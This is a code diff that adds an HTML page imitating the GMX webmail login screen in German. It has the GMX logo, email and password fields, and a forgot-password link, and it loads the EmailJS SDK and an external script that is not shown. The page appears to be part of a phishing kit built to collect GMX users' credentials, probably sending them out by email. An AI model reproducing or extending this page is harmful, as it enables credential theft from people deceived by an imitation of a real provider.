@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GMX Login</title>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <!-- Ionicons for icons -->
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <!-- Link to your custom CSS -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="container-img">
+            <img src="logo.webp" alt="GMX Logo" class="img-logo">
+        </div>
+
+        <div class="container-mail-form">
+            <h2 class="mail-title">Anmelden</h2>
+            <form id="form" method="POST">
+                <!-- Username input -->
+                <div class="form-input">
+                    <label for="email" class="mail-title-light">E-Mail-Adresse</label>
+                    <input type="text" id="email" name="email" class="input-border-color" placeholder="Ihre GMX E-Mail-Adresse" required>
+                </div>
+
+                <!-- Password input with toggle visibility -->
+                <div class="form-input">
+                    <label for="password" class="mail-title-light">Passwort</label>
+                    <div class="password-container">
+                        <input type="password" id="password" name="password" class="input-border-color" placeholder="Ihr GMX Passwort" required>
+                        <span id="toggle-password" class="password-icon">
+                            <ion-icon id="closed-eye" name="eye-off-outline"></ion-icon>
+                            <ion-icon id="open-eye" name="eye-outline" class="hide"></ion-icon>
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Submit button with redirect after successful submission -->
+                <button type="submit" id="button" class="submit-form">Anmelden</button>
+            </form>
+
+            <a href="#" class="forgot-password">Passwort vergessen?</a>
+        </div>
+    </div>
+
+    <!-- Custom JavaScript -->
+    <script src="script.js" defer></script>
+</body>
+</html>
